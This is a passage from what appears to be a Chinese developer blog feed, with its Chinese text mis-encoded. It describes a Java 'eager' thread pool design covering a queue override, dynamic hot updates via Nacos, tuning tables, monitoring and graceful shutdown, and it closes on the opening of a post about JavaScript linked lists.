    EXPORT_DATA(<span class="hljs-string">"export-task"</span>, <span class="hljs-number">2</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">10</span>);   <span class="hljs-comment">// æŠ¥è¡¨å¯¼å‡ºï¼ˆä½ä¼˜å…ˆçº§ï¼‰</span>

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String businessName;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> coreSize;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> maxSize;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> queueCapacity;
}
</code></pre>
<p><strong>è®¾è®¡ä»·å€¼</strong>ï¼š</p>
<ul>
<li><strong>å¼ºåˆ¶è§„èŒƒ</strong>ï¼šæœç»ä»£ç ä¸­ç¡¬ç¼–ç çº¿ç¨‹æ± åç§°</li>
<li><strong>é›†ä¸­ç®¡æ§</strong>ï¼šæ‰€æœ‰å‚æ•°æ”¶å£åˆ°æšä¸¾ï¼Œä¾¿äºå®¡è®¡</li>
<li><strong>ç±»å‹å®‰å…¨</strong>ï¼šç¼–è¯‘æœŸæ£€æŸ¥ï¼Œé¿å…æ‹¼å†™é”™è¯¯</li>
</ul>
<h4 data-id="heading-7">â‘¡ æ ¸å¿ƒé˜Ÿåˆ—ï¼šEagerQueue çš„"æ¬ºéª—"ç­–ç•¥</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicEagerQueue</span>&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Runnable</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;Runnable&gt; {
    <span class="hljs-keyword">private</span> ThreadPoolExecutor executor;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">offer</span><span class="hljs-params">(Runnable runnable)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">currentPoolSize</span> <span class="hljs-operator">=</span> executor.getPoolSize();
        <span class="hljs-comment">// å…³é”®é€»è¾‘ï¼šåªè¦è¿˜èƒ½åˆ›å»ºçº¿ç¨‹ï¼Œå°±"æ¬ºéª—"çº¿ç¨‹æ± è¯´é˜Ÿåˆ—æ»¡äº†</span>
        <span class="hljs-keyword">if</span> (currentPoolSize &lt; executor.getMaximumPoolSize()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è§¦å‘çº¿ç¨‹æ± åˆ›å»ºæ–°çº¿ç¨‹</span>
        }
        <span class="hljs-comment">// çœŸæ­£è¾¾åˆ°æœ€å¤§çº¿ç¨‹åï¼Œæ‰å…è®¸å…¥é˜Ÿ</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.offer(runnable);
    }

    <span class="hljs-comment">// æ‹’ç»ç­–ç•¥ä¸­çš„å…œåº•æ–¹æ³•ï¼šå¼ºåˆ¶å…¥é˜Ÿ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">forceOffer</span><span class="hljs-params">(Runnable runnable)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.offer(runnable);
    }
    
    <span class="hljs-comment">// æ”¯æŒåŠ¨æ€è°ƒæ•´å®¹é‡ï¼ˆåå°„ä¿®æ”¹ final å­—æ®µï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCapacity</span><span class="hljs-params">(<span class="hljs-type">int</span> capacity)</span> {
        <span class="hljs-comment">// ... åå°„å®ç°</span>
    }
}
</code></pre>
<p><strong>ç²¾å¦™ä¹‹å¤„</strong>ï¼šé€šè¿‡é‡å†™ <code>offer()</code> æ–¹æ³•ï¼Œ<strong>åè½¬äº†çº¿ç¨‹æ± çš„å†³ç­–é€»è¾‘</strong>ï¼Œè®©çº¿ç¨‹åˆ›å»ºä¼˜å…ˆçº§é«˜äºé˜Ÿåˆ—ç§¯å‹ã€‚</p>
<h4 data-id="heading-8">â‘¢ æ‰§è¡Œå™¨ï¼šåŒä¿é™©æäº¤æœºåˆ¶</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EagerThreadPoolExecutor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ThreadPoolExecutor</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(Runnable command)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ç¬¬ä¸€æ¬¡ï¼šå°è¯• Eager æ¨¡å¼ï¼ˆä¼˜å…ˆæ‰©çº¿ç¨‹ï¼‰</span>
            <span class="hljs-built_in">super</span>.execute(command);
        } <span class="hljs-keyword">catch</span> (RejectedExecutionException e) {
            <span class="hljs-comment">// ç¬¬äºŒæ¬¡ï¼šçº¿ç¨‹å·²æ»¡ï¼Œå¼ºåˆ¶å…¥é˜Ÿå…œåº•</span>
            DynamicEagerQueue&lt;Runnable&gt; queue = (DynamicEagerQueue&lt;Runnable&gt;) getQueue();
            <span class="hljs-keyword">if</span> (!queue.forceOffer(command)) {
                <span class="hljs-comment">// é˜Ÿåˆ—ä¹Ÿæ»¡äº†ï¼ŒçœŸæ­£æ‹’ç»</span>
                getRejectedExecutionHandler().rejectedExecution(command, <span class="hljs-built_in">this</span>);
            }
        }
    }
}
</code></pre>
<p><strong>åŒä¿é™©è®¾è®¡</strong>ï¼š</p>
<ol>
<li><strong>ç¬¬ä¸€ä¿é™©</strong>ï¼šEager æ¨¡å¼å¿«é€Ÿæ‰©å®¹çº¿ç¨‹ï¼Œé™ä½å»¶è¿Ÿ</li>
<li><strong>ç¬¬äºŒä¿é™©</strong>ï¼š<code>forceOffer</code> ç¡®ä¿çº¿ç¨‹æ»¡åä»æœ‰é˜Ÿåˆ—ç¼“å†²ï¼Œé¿å…ç›´æ¥æ‹’ç»</li>
</ol>
<hr/>
<h2 data-id="heading-9">ä¸‰ã€åŠ¨æ€æ²»ç†èƒ½åŠ›</h2>
<h3 data-id="heading-10">3.1 è¿è¡Œæ—¶çƒ­æ›´æ–°</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicThreadPoolManager</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updatePool</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> core, <span class="hljs-type">int</span> max, <span class="hljs-type">int</span> queueCap)</span> {
        <span class="hljs-type">EagerThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> poolMap.get(name);
        <span class="hljs-keyword">if</span> (executor == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;
        
        <span class="hljs-comment">// 1. å…ˆæ‰©é˜Ÿåˆ—ï¼ˆé¿å…è°ƒæ•´è¿‡ç¨‹ä¸­ä»»åŠ¡è¢«æ‹’ç»ï¼‰</span>
        ((DynamicEagerQueue&lt;?&gt;) executor.getQueue()).setCapacity(queueCap);
        
        <span class="hljs-comment">// 2. è°ƒæ•´æ ¸å¿ƒçº¿ç¨‹ï¼ˆJDK ä¼šæŒ‰éœ€åˆ›å»º/å›æ”¶ï¼‰</span>
        executor.setCorePoolSize(core);
        
        <span class="hljs-comment">// 3. è°ƒæ•´æœ€å¤§çº¿ç¨‹ï¼ˆå…³é”®ï¼šå½±å“ Eager è§¦å‘é˜ˆå€¼ï¼‰</span>
        executor.setMaximumPoolSize(max);
        
        log.info(<span class="hljs-string">"çƒ­æ›´æ–°å®Œæˆ [{}]: core={}, max={}, queue={}"</span>, name, core, max, queueCap);
    }
}
</code></pre>
<p><strong>æ›´æ–°é¡ºåºå»ºè®®</strong>ï¼šé˜Ÿåˆ—å®¹é‡ â†’ æ ¸å¿ƒçº¿ç¨‹ â†’ æœ€å¤§çº¿ç¨‹ï¼ˆé¿å…ç¬æ—¶æ‹’ç»ï¼‰</p>
<h3 data-id="heading-11">3.2 Nacos é…ç½®é›†æˆ</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Nacos é…ç½®ï¼šdynamic-thread-pool.yaml</span>
<span class="hljs-attr">threadPools:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">businessName:</span> <span class="hljs-string">order-pay</span>
    <span class="hljs-attr">core:</span> <span class="hljs-number">20</span>        <span class="hljs-comment"># å¤§ä¿ƒæœŸé—´æå‡</span>
    <span class="hljs-attr">max:</span> <span class="hljs-number">100</span>
    <span class="hljs-attr">queueCap:</span> <span class="hljs-number">500</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">businessName:</span> <span class="hljs-string">export-task</span>
    <span class="hljs-attr">core:</span> <span class="hljs-number">2</span>         <span class="hljs-comment"># ä½ä¼˜å…ˆçº§ä¿æŒä¿å®ˆ</span>
    <span class="hljs-attr">max:</span> <span class="hljs-number">5</span>
    <span class="hljs-attr">queueCap:</span> <span class="hljs-number">50</span>
</code></pre>
<hr/>
<h2 data-id="heading-12">å››ã€ç”Ÿäº§ç¯å¢ƒæœ€ä½³å®è·µ</h2>
<h3 data-id="heading-13">4.1 å‚æ•°è°ƒä¼˜æŒ‡å—</h3>








































<table><thead><tr><th>ä¸šåŠ¡ç±»å‹</th><th>Core</th><th>Max</th><th>Queue</th><th>ç­–ç•¥è¯´æ˜</th></tr></thead><tbody><tr><td><strong>API ç½‘å…³</strong></td><td>CPUæ ¸æ•°</td><td>CPUæ ¸æ•°*4</td><td>100-200</td><td>å¿«é€Ÿå“åº”ï¼Œé˜Ÿåˆ—ä»…ä½œç¼“å†²</td></tr><tr><td><strong>è®¢å•æ”¯ä»˜</strong></td><td>20</td><td>100</td><td>500</td><td>å¤§ä¿ƒæ—¶ Max å¯ä¸´æ—¶ä¸Šè°ƒ</td></tr><tr><td><strong>æŠ¥è¡¨å¯¼å‡º</strong></td><td>2</td><td>5</td><td>10</td><td>ä½ä¼˜å…ˆçº§ï¼Œé™åˆ¶èµ„æºå ç”¨</td></tr><tr><td><strong>å¼‚æ­¥é€šçŸ¥</strong></td><td>10</td><td>50</td><td>1000</td><td>å…è®¸é€‚å½“æ’é˜Ÿï¼Œä¿è¯åå</td></tr></tbody></table>
<h3 data-id="heading-14">4.2 å®‰å…¨é˜²æŠ¤ checklist</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">validateAndUpdate</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> core, <span class="hljs-type">int</span> max, <span class="hljs-type">int</span> queueCap)</span> {
    <span class="hljs-comment">// 1. åŸºç¡€æ ¡éªŒ</span>
    <span class="hljs-keyword">if</span> (core &gt; max) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"core &gt; max"</span>);
    <span class="hljs-keyword">if</span> (max &gt; <span class="hljs-number">1000</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"max è¶…è¿‡å®‰å…¨é˜ˆå€¼"</span>);
    <span class="hljs-keyword">if</span> (queueCap &gt; <span class="hljs-number">10000</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"é˜Ÿåˆ—è¿‡å¤§å¯èƒ½å¯¼è‡´ OOM"</span>);
    
    <span class="hljs-comment">// 2. æ¸è¿›å¼æ›´æ–°ï¼ˆé¿å…ç¬æ—¶å†²å‡»ï¼‰</span>
    <span class="hljs-type">EagerThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> poolMap.get(name);
    <span class="hljs-type">int</span> <span class="hljs-variable">currentMax</span> <span class="hljs-operator">=</span> executor.getMaximumPoolSize();
    
    <span class="hljs-keyword">if</span> (max &gt; currentMax) {
        <span class="hljs-comment">// æ‰©å®¹ï¼šå…ˆåŠ é˜Ÿåˆ— â†’ å†æ‰©çº¿ç¨‹ï¼ˆé˜²æ­¢ä»»åŠ¡ä¸¢å¤±ï¼‰</span>
        updateQueueFirst(executor, queueCap);
        updateThreads(executor, core, max);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// ç¼©å®¹ï¼šå…ˆç¼©çº¿ç¨‹ â†’ å†ç¼©é˜Ÿåˆ—ï¼ˆé˜²æ­¢ OOMï¼‰</span>
        updateThreads(executor, core, max);
        updateQueueLater(executor, queueCap);
    }
}
</code></pre>
<h3 data-id="heading-15">4.3 ç›‘æ§åŸ‹ç‚¹æ–¹æ¡ˆ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åœ¨ updatePool ä¸­å¢åŠ  Micrometer æŒ‡æ ‡</span>
meterRegistry.gauge(<span class="hljs-string">"eager.pool.core"</span>, 
    Tags.of(<span class="hljs-string">"biz"</span>, name), executor, ThreadPoolExecutor::getCorePoolSize);
meterRegistry.gauge(<span class="hljs-string">"eager.pool.active"</span>, 
    Tags.of(<span class="hljs-string">"biz"</span>, name), executor, ThreadPoolExecutor::getActiveCount);
meterRegistry.gauge(<span class="hljs-string">"eager.pool.queue.size"</span>, 
    Tags.of(<span class="hljs-string">"biz"</span>, name), executor, e -&gt; e.getQueue().size());

<span class="hljs-comment">// å‘Šè­¦è§„åˆ™</span>
<span class="hljs-comment">// - active / max &gt; 0.8 æŒç»­ 1 åˆ†é’Ÿï¼šæ‰©å®¹æé†’</span>
<span class="hljs-comment">// - queue.size / capacity &gt; 0.9ï¼šé˜Ÿåˆ—ç§¯å‹å‘Šè­¦</span>
</code></pre>
<h3 data-id="heading-16">4.4 ä¼˜é›…å…³é—­æœºåˆ¶</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPoolGracefulShutdown</span> {
    
    <span class="hljs-meta">@PreDestroy</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> {
        poolMap.forEach((name, executor) -&gt; {
            <span class="hljs-comment">// 1. åœæ­¢æ¥æ”¶æ–°ä»»åŠ¡</span>
            executor.shutdown();
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 2. ç­‰å¾…å­˜é‡ä»»åŠ¡å®Œæˆï¼ˆæœ€å¤š 60 ç§’ï¼‰</span>
                <span class="hljs-keyword">if</span> (!executor.awaitTermination(<span class="hljs-number">60</span>, TimeUnit.SECONDS)) {
                    log.warn(<span class="hljs-string">"[{}] çº¿ç¨‹æ± æœªä¼˜é›…å…³é—­ï¼Œå¼ºåˆ¶ä¸­æ–­"</span>, name);
                    executor.shutdownNow();
                }
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                executor.shutdownNow();
            }
        });
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-17">äº”ã€EagerThreadPool çš„æ ¸å¿ƒä¼˜åŠ¿æ€»ç»“</h2>









































<table><thead><tr><th>ç»´åº¦</th><th>æ ‡å‡†çº¿ç¨‹æ± </th><th>EagerThreadPool</th><th>ä¸šåŠ¡ä»·å€¼</th></tr></thead><tbody><tr><td><strong>å“åº”å»¶è¿Ÿ</strong></td><td>ä»»åŠ¡å…ˆå…¥é˜Ÿæ’é˜Ÿ</td><td>ç«‹å³åˆ›å»ºçº¿ç¨‹å¤„ç†</td><td>RT é™ä½ 50%-80%</td></tr><tr><td><strong>èµ„æºåˆ©ç”¨</strong></td><td>ä¿å®ˆä½¿ç”¨çº¿ç¨‹</td><td>å¿«é€Ÿæ‰“æ»¡ Max çº¿ç¨‹</td><td>CPU/IO åˆ©ç”¨ç‡æœ€å¤§åŒ–</td></tr><tr><td><strong>å¼¹æ€§èƒ½åŠ›</strong></td><td>é™æ€é…ç½®</td><td>æ”¯æŒè¿è¡Œæ—¶çƒ­æ›´æ–°</td><td>å¤§ä¿ƒæœŸé—´æ— ç¼æ‰©å®¹</td></tr><tr><td><strong>éš”ç¦»æ€§</strong></td><td>æ··åˆä½¿ç”¨</td><td>æŒ‰ä¸šåŠ¡ç»´åº¦ç‹¬ç«‹æ± </td><td>æ•…éšœéš”ç¦»ï¼Œç²¾å‡†é™çº§</td></tr><tr><td><strong>å¯è§‚æµ‹æ€§</strong></td><td>åŸºç¡€ç›‘æ§</td><td>ç»†ç²’åº¦ä¸šåŠ¡ç»´åº¦æŒ‡æ ‡</td><td>å¿«é€Ÿå®šä½ç“¶é¢ˆ</td></tr></tbody></table>
<h3 data-id="heading-18">å…¸å‹æ”¶ç›Šåœºæ™¯</h3>
<p><strong>åœºæ™¯ 1ï¼šç”µå•†å¤§ä¿ƒ</strong></p>
<ul>
<li>æ ‡å‡†æ± ï¼šé˜Ÿåˆ—ç§¯å‹ 1000+ï¼Œæ¥å£ P99 ä» 200ms é£™åˆ° 5s</li>
<li>Eager æ± ï¼šçº¿ç¨‹ç«‹å³æ‰©è‡³ 100ï¼ŒP99 ç¨³å®šåœ¨ 300ms</li>
</ul>
<p><strong>åœºæ™¯ 2ï¼šé‡‘èæ”¯ä»˜</strong></p>
<ul>
<li>æ ‡å‡†æ± ï¼šæ ¸å¿ƒçº¿ç¨‹ 20ï¼Œé˜Ÿåˆ— 500ï¼Œçªå‘æµé‡æ—¶æ’é˜Ÿä¸¥é‡</li>
<li>Eager æ± ï¼šçº¿ç¨‹å¿«é€Ÿæ‰©è‡³ 100ï¼Œé˜Ÿåˆ—ä»…ä½œä¸ºæç«¯å…œåº•</li>
</ul>
<hr/>
<h2 data-id="heading-19">å…­ã€æºç çº§æ³¨æ„äº‹é¡¹</h2>
<ol>
<li><strong>åå°„ä¿®æ”¹ capacity</strong>ï¼šJDK 9+ éœ€æ·»åŠ  <code>--add-opens java.base/java.util.concurrent=ALL-UNNAMED</code></li>
<li><strong>æ‹’ç»ç­–ç•¥é€‰æ‹©</strong>ï¼šå»ºè®®ä½¿ç”¨ <code>CallerRunsPolicy</code> æˆ–è‡ªå®šä¹‰é™çº§é€»è¾‘ï¼Œé¿å…ç›´æ¥ä¸¢å¼ƒä»»åŠ¡</li>
<li><strong>çº¿ç¨‹å·¥å‚</strong>ï¼šåŠ¡å¿…è‡ªå®šä¹‰å‘½åï¼ˆå¦‚ <code>order-pay-pool-1</code>ï¼‰ï¼Œä¾¿äºçº¿ç¨‹ Dump åˆ†æ</li>
</ol>
<hr/>
<p>è¿™å¥—æ–¹æ¡ˆå·²åœ¨å¤šä¸ªé«˜å¹¶å‘åœºæ™¯éªŒè¯ï¼Œæ ¸å¿ƒæ˜¯å°†<strong>çº¿ç¨‹åˆ›å»ºä¼˜å…ˆçº§</strong>ç½®äº<strong>ä»»åŠ¡æ’é˜Ÿ</strong>ä¹‹å‰ï¼Œé…åˆåŠ¨æ€æ²»ç†èƒ½åŠ›ï¼Œå®ç°çœŸæ­£çš„"å¼¹æ€§"çº¿ç¨‹æ± ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScripté“¾è¡¨ä¸åŒå‘é“¾è¡¨å®ç°ï¼šç†è§£æ•°ç»„ä¸é“¾è¡¨çš„å·®å¼‚]]></title>    <link>https://juejin.cn/post/7604155045237162019</link>    <guid>https://juejin.cn/post/7604155045237162019</guid>    <pubDate>2026-02-09T09:47:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604155045237162019" data-draft-id="7604493165328138274" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScripté“¾è¡¨ä¸åŒå‘é“¾è¡¨å®ç°ï¼šç†è§£æ•°ç»„ä¸é“¾è¡¨çš„å·®å¼‚"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-02-09T09:47:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wuhen_n"/> <meta itemprop="url" content="https://juejin.cn/user/4149996261738233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScripté“¾è¡¨ä¸åŒå‘é“¾è¡¨å®ç°ï¼šç†è§£æ•°ç»„ä¸é“¾è¡¨çš„å·®å¼‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4149996261738233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wuhen_n
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:47:00.000Z" title="Mon Feb 09 2026 09:47:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æ•°ç»„åœ¨ JavaScript ä¸­å¦‚æ­¤æ–¹ä¾¿ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦é“¾è¡¨å‘¢ï¼Ÿå½“ V8 å¼•æ“å¤„ç†æ•°ç»„æ—¶ï¼Œé“¾è¡¨åˆåœ¨å“ªäº›åœºæ™¯ä¸‹æ›´æœ‰ä¼˜åŠ¿ï¼Ÿæœ¬ç¯‡æ–‡ç« å°†æ·±å…¥æ¢è®¨æ•°æ®ç»“æ„çš„æ ¸å¿ƒå·®å¼‚ã€‚</p>
</blockquote>
<h2 data-id="heading-0">å‰è¨€ï¼šä»ä¸€é“é¢è¯•é¢˜è¯´èµ·</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é¢è¯•é¢˜ï¼šå¦‚ä½•é«˜æ•ˆåœ°ä»å¤§å‹æ•°æ®é›†åˆä¸­é¢‘ç¹æ’å…¥å’Œåˆ é™¤å…ƒç´ ï¼Ÿ</span>
<span class="hljs-keyword">const</span> data = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>];

<span class="hljs-comment">// åœºæ™¯1ï¼šåœ¨æ•°ç»„å¼€å¤´æ’å…¥å…ƒç´ ï¼ˆæ€§èƒ½å¦‚ä½•ï¼Ÿï¼‰</span>
data.<span class="hljs-title function_">unshift</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// éœ€è¦ç§»åŠ¨æ‰€æœ‰å…ƒç´ ï¼</span>

<span class="hljs-comment">// åœºæ™¯2ï¼šåœ¨æ•°ç»„ä¸­é—´åˆ é™¤å…ƒç´ ï¼ˆæ€§èƒ½å¦‚ä½•ï¼Ÿï¼‰</span>
data.<span class="hljs-title function_">splice</span>(<span class="hljs-number">5</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// éœ€è¦ç§»åŠ¨ä¸€åŠçš„å…ƒç´ ï¼</span>

<span class="hljs-comment">// åœºæ™¯3ï¼šåªéœ€è¦é¡ºåºè®¿é—®æ•°æ®</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; data.<span class="hljs-property">length</span>; i++) {
